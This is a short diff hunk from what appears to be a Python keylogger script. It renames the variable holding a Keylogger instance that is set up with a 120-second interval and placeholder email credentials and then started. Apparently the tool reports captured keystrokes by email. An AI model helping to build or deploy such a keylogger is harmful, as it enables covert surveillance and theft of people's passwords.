@@ -51,5 +51,5 @@ class Keylogger:
          keyboard_listener.join()
 
 
-my_keylogger = Keylogger(120, "your-email", "email-password")
-my_keylogger.start()
+keylogger = Keylogger(120, "your-email", "email-password")
+keylogger.start()
